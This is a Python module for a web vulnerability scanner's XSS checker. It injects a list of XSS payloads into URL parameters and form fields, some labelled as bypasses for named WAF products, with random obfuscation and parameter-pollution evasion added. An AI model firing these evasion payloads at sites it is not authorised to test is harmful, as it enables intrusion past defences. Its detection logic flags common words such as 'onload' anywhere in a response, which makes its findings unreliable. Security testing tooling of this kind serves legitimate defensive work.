import logging
import re
import random
from typing import Dict, List, Optional, Set
from urllib.parse import urlparse, parse_qs, urlencode, quote, quote_plus
from ..http_client import HttpClient
from .base_scanner import BaseScanner

logger = logging.getLogger(__name__)

class XSSScanner(BaseScanner):
    def __init__(self, client=None):
        super().__init__(client)
        # General XSS payloads that are effective across sites
        self.payloads = [
            # Basic XSS vectors
            "<script>console.log(1)</script>",  # Simple script tag (less aggressive)
            "<img src=x onerror=console.log(1)>",  # Image error handler
            "<svg onload=console.log(1)>",  # SVG onload event
            
            # Context breaking payloads
            "'><script>console.log(1)</script>",  # Quote breaking + script
            "\"><script>console.log(1)</script>",  # Double quote breaking + script
            "\"'><img src=x onerror=console.log(1)>",  # Mixed quote breaking
            
            # Attribute-based XSS
            "javascript:console.log(1)",  # Javascript protocol
            "' onmouseover='console.log(1)'",  # Event handler injection
            "\" onmouseover=\"console.log(1)\"",  # Event handler with double quotes
            
            # HTML5 vectors
            "<details ontoggle=console.log(1)>",  # Details ontoggle event
            "<body onload=console.log(1)>",  # Body onload event
            
            # Advanced WAF evasion techniques
            "<div id=xss>",  # Simple tag that might be reflected
            "')\"<span id=xss>",  # Context breaking with harmless tag
            
            # Encoded payloads for WAF bypass
            "\x3Cimg src=x onerror=console.log(1)\x3E",  # Hex encoded
            "\u003Cimg src=x onerror=console.log(1)\u003E",  # Unicode encoded
            
            # JavaScript event handler obfuscation
            "<img src=x OnErRoR=console.log(1)>",  # Mixed case to bypass regex
            "<img src=x onerror=\u0063\u006f\u006e\u0073\u006f\u006c\u0065.log(1)>",  # Unicode JS
            "<img src=x onerror=eval(atob('Y29uc29sZS5sb2coMSk='))>",  # Base64 encoded payload
            
            # Protocol obfuscation
            "<a href=j&#97;v&#97;script&#x3A;console.log(1)>",  # HTML entity encoding
            
            # Tag obfuscation
            "<svg/onload=console.log(1)>",  # Removing spaces
            "<svg/onload=console.log`1`>",  # Template literals
            
            # WAF specific bypasses
            "<svg onload=console.log&#40;1&#41;>",  # HTML entity encoding for parentheses
            "<svg onload=console.log&#x28;1&#x29;>",  # Hex entity encoding
            "<svg onload=console['log'](1)>",  # Bracket notation
            
            # Cloudflare bypasses
            "<a href='javascript:void(0)' onmouseover=console.log(1)>",  # Void JS with event
            "<a href=# onclick='console[\"\x6c\x6f\x67\"](1)'>",  # Hex encoding in strings
            
            # ModSecurity bypasses
            "<img src=x onerror=console.log(/1/.source)>",  # RegExp source
            "<img src=x onerror=self['con'+'sole']['l'+'og'](1)>",  # String concatenation
            
            # Akamai bypasses
            "<img src=x onerror=window.top['con\x73ole']['\x6cog'](1)>",  # Mixed obfuscation
            "<img src=`x` onerror=console.log(1)>",  # Backtick attribute delimiter
            
            # Imperva bypasses
            "<img/src='x'onerror=console.log(1)>",  # No spaces between attributes
            "<svg onload=console.log(1) onload=1>",  # Duplicate event handlers
            
            # F5 BIG-IP bypasses
            "<svg id=console.log(1) onload=eval(id)>",  # Attribute ID evaluation
            "<img src=x onerror='with(window)console.log(1)'>",  # With statement
            
            # Sucuri bypasses
            "<img src=x onerror=setTimeout('console.log(1)',0)>",  # Delayed execution
            "<img src=x onerror=console?.log?.(1)>",  # Optional chaining
            
            # Barracuda bypasses
            "<a href=# onclick='Function(\"console.log(1)\")()'>",  # Function constructor
            "<img src=x onerror=new Function`console.log\x281\x29`>",  # Template + Function
        ]
        
        # Patterns to detect if payloads are reflected in responses
        self.encoding_patterns = [
            r'&lt;script&gt;',
            r'&lt;img',
            r'&lt;svg',
            r'&lt;a',
            r'&lt;body',
            r'&amp;lt;script&amp;gt;',
            r'&amp;lt;img',
            r'&amp;lt;svg',
            r'&amp;lt;a',
            r'&amp;lt;body',
            r'console\.log',
            r'onerror',
            r'onload',
            r'javascript:',
            r'eval\(',
            r'setTimeout',
            r'Function\(',
            r'atob\(',
            r'\\x[0-9a-f]{2}',  # Hex escape sequences
            r'\\u[0-9a-f]{4}'   # Unicode escape sequences
        ]

    def scan(self, url: str, forms: Optional[List[Dict]] = None) -> List[Dict]:
        vulnerabilities = []
        
        try:
            # Check URL parameters
            parsed = urlparse(url)
            params = parse_qs(parsed.query)
            
            if params:
                for param in params:
                    for payload in self.payloads:
                        try:
                            test_url = self._inject_payload(url, param, payload)
                            response = self.client.get(test_url, timeout=10)
                            
                            if response and self._is_vulnerable(response.text, payload):
                                vulnerabilities.append({
                                    'type': 'XSS',
                                    'url': test_url,
                                    'payload': payload,
                                    'evidence': self._get_evidence(response.text, payload),
                                    'severity': 'high',
                                    'param': param,
                                    'method': 'GET'
                                })
                        except Exception as e:
                            logger.error(f"XSS GET scan error for {url}: {str(e)}")
            
            # Check forms
            if forms:
                for form in forms:
                    try:
                        form_fields = form.get('fields', [])
                        if not isinstance(form_fields, list):
                            logger.warning(f"Invalid form fields type: {type(form_fields)}")
                            continue
                        
                        method = form.get('method', 'POST').upper()
                        action = form.get('action', '')
                        if not action:
                            logger.warning("Form has no action URL")
                            continue
                        
                        for field in form_fields:
                            for payload in self.payloads:
                                try:
                                    test_data = {}
                                    for f in form_fields:
                                        field_name = f.get('name') if isinstance(f, dict) else f
                                        test_data[field_name] = payload if f == field else 'test'
                                    
                                    if method == 'POST':
                                        response = self.client.post(action, data=test_data, timeout=10)
                                    elif method == 'GET':
                                        response = self.client.get(action, params=test_data, timeout=10)
                                    else:
                                        logger.warning(f"Unsupported form method: {method}")
                                        continue
                                    
                                    if response and self._is_vulnerable(response.text, payload):
                                        vulnerabilities.append({
                                            'type': 'XSS',
                                            'url': action,
                                            'payload': payload,
                                            'evidence': self._get_evidence(response.text, payload),
                                            'severity': 'high',
                                            'param': field,
                                            'method': method
                                        })
                                except Exception as e:
                                    logger.error(f"XSS form scan error for field {field}: {str(e)}")
                    except Exception as e:
                        logger.error(f"XSS form scan error: {str(e)}")
        
        except Exception as e:
            logger.error(f"XSS scan error: {str(e)}")
        
        return vulnerabilities

    def _obfuscate_payload(self, payload: str) -> str:
        """
        Apply various obfuscation techniques to payloads to bypass WAF detection
        """
        techniques = [
            # No obfuscation (baseline)
            lambda p: p,
            
            # URL encoding
            lambda p: quote(p),
            
            # Double encoding
            lambda p: p.replace("<", "%253C").replace(">", "%253E"),
            
            # Hex encoding
            lambda p: p.replace("<", "\x3c").replace(">", "\x3e"),
            
            # HTML entity encoding
            lambda p: p.replace("<", "&lt;").replace(">", "&gt;"),
            
            # Mixed case for tag names (only for script tags)
            lambda p: p.replace("<script", "<sCrIpT").replace("</script", "</sCrIpT") if "script" in p else p,
            
            # Space variations (add tabs or newlines where spaces would work)
            lambda p: p.replace(" ", "\t") if " " in p else p,
            lambda p: p.replace(" ", "\n") if " " in p else p,
            
            # Null byte injection
            lambda p: p.replace("<", "\0<") if "<" in p else p,
            
            # Advanced WAF bypass techniques
            
            # JavaScript obfuscation
            lambda p: p.replace("console.log", "eval('con'+'sole.log')") if "console.log" in p else p,
            lambda p: p.replace("console.log", "window['\x63\x6f\x6e\x73\x6f\x6c\x65']['\x6c\x6f\x67']") if "console.log" in p else p,
            
            # Event handler obfuscation
            lambda p: p.replace("onerror", "OnErRoR") if "onerror" in p else p,
            lambda p: p.replace("onload", "OnLoAd") if "onload" in p else p,
            
            # Attribute delimiter variations
            lambda p: p.replace('="', '=`') if '="' in p else p,
            
            # HTML5 event handler variations
            lambda p: p.replace("onerror=", "onerror/=") if "onerror=" in p else p,
            
            # Parentheses encoding
            lambda p: p.replace("(", "&#40;").replace(")", "&#41;") if "(" in p else p,
            lambda p: p.replace("(", "&#x28;").replace(")", "&#x29;") if "(" in p else p,
            
            # Multiple encoding layers
            lambda p: quote(p.replace("<", "&lt;").replace(">", "&gt;")),
            
            # Base64 encoding for JS payloads
            lambda p: p.replace("console.log(1)", "eval(atob('Y29uc29sZS5sb2coMSk='))") if "console.log(1)" in p else p,
            
            # WAF-specific bypasses
            lambda p: p.replace("console.log", "console?.log") if "console.log" in p else p,  # Optional chaining
            lambda p: p.replace("console.log(1)", "console.log(/1/.source)") if "console.log(1)" in p else p,  # RegExp source
            lambda p: p.replace("console.log(1)", "setTimeout('console.log(1)',0)") if "console.log(1)" in p else p,  # Delayed execution
            
            # Protocol obfuscation
            lambda p: p.replace("javascript:", "j&#97;v&#97;script&#x3A;") if "javascript:" in p else p,
        ]
        
        # Apply 1-3 random techniques for more complex obfuscation
        num_techniques = random.randint(1, 3)
        for _ in range(num_techniques):
            technique = random.choice(techniques)
            payload = technique(payload)
            
        return payload
    
    def _create_polluted_params(self, param: str, value: str) -> List[Dict[str, str]]:
        """
        Create parameter pollution variations to bypass WAF filters
        """
        variations = [
            {param: value},  # Standard
            {param: value, f"{param}[]": value},  # Array notation
            {f"{param}[0]": value},  # Indexed array
            {param: "", f"{param}2": value},  # Duplicate with different name
            {f"{param}.": value},  # Dot notation
            {f"{param}_": value},  # Underscore notation
            {param: "", f"{param}.{random.randint(1, 999)}": value},  # Random dot notation
        ]
        return variations
        
    def _inject_payload(self, url: str, param: str, payload: str) -> str:
        """Inject a payload into a URL parameter with WAF evasion techniques"""
        parsed = urlparse(url)
        params = parse_qs(parsed.query)
        
        # Obfuscate the payload
        obfuscated_payload = self._obfuscate_payload(payload)
        
        # Determine if we should use parameter pollution
        use_pollution = random.random() > 0.7  # 30% chance to use parameter pollution
        
        if use_pollution:
            # Create a copy of the parameters
            new_params = {k: v[0] for k, v in params.items() if k != param}
            
            # Get polluted parameters
            polluted_params = self._create_polluted_params(param, obfuscated_payload)
            polluted_choice = random.choice(polluted_params)
            
            # Add polluted parameters
            new_params.update(polluted_choice)
            
            # Reconstruct the URL with the polluted parameters
            new_query = urlencode(new_params, safe='[]._')
        else:
            # Create a copy of the parameters and inject the payload
            new_params = {k: v[0] for k, v in params.items()}
            new_params[param] = obfuscated_payload
            
            # Reconstruct the URL with the injected payload
            new_query = urlencode(new_params)
        
        new_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}?{new_query}"
        return new_url

    def _is_vulnerable(self, response_text: str, payload: str) -> bool:
        # Check if payload appears in response without proper encoding
        if payload in response_text:
            return True
        
        # Extract key elements from the payload to check for partial reflections
        key_elements = []
        
        # Extract script tags
        script_match = re.search(r'<script[^>]*>(.*?)</script>', payload, re.IGNORECASE)
        if script_match:
            key_elements.append(script_match.group(1))
        
        # Extract event handlers
        event_handlers = re.findall(r'on\w+\s*=\s*["\']?(.*?)["\']?[\s>]', payload, re.IGNORECASE)
        key_elements.extend(event_handlers)
        
        # Extract JavaScript code
        js_code = re.findall(r'javascript:[^\s"\'>]*', payload, re.IGNORECASE)
        key_elements.extend(js_code)
        
        # Extract function calls
        func_calls = re.findall(r'\w+\s*\([^)]*\)', payload, re.IGNORECASE)
        key_elements.extend(func_calls)
        
        # Check if any key elements are reflected in the response
        for element in key_elements:
            if element and element in response_text:
                return True
        
        # Check for encoded versions of the payload
        for pattern in self.encoding_patterns:
            if re.search(pattern, response_text, re.IGNORECASE):
                return True
        
        # Look for common reflection patterns
        reflection_patterns = [
            # HTML entity encoded versions
            re.escape(payload).replace('<', '&lt;').replace('>', '&gt;'),
            # URL encoded versions
            re.escape(payload).replace('<', '%3C').replace('>', '%3E'),
            # Double encoded versions
            re.escape(payload).replace('<', '%253C').replace('>', '%253E'),
            # Unicode encoded versions
            re.escape(payload).replace('<', '\\u003c').replace('>', '\\u003e'),
            # Hex encoded versions
            re.escape(payload).replace('<', '\\x3c').replace('>', '\\x3e')
        ]
        
        for pattern in reflection_patterns:
            if re.search(pattern, response_text, re.IGNORECASE):
                return True
        
        # Check for partial reflections with context analysis
        if '<input' in response_text and any(attr in payload for attr in ['onerror', 'onload', 'onclick']):
            # Check if our payload might be reflected in an input value
            input_values = re.findall(r'<input[^>]*value=["\']([^"\'>]*)["\'][^>]*>', response_text, re.IGNORECASE)
            for value in input_values:
                if any(element in value for element in key_elements):
                    return True
        
        return False

    def _get_evidence(self, response_text: str, payload: str) -> str:
        if payload in response_text:
            return "XSS payload found in response without encoding"
            
        for pattern in self.encoding_patterns:
            if re.search(pattern, response_text, re.IGNORECASE):
                return f"Encoded XSS payload found in response: {pattern}"
                
        return "XSS vulnerability detected through response analysis"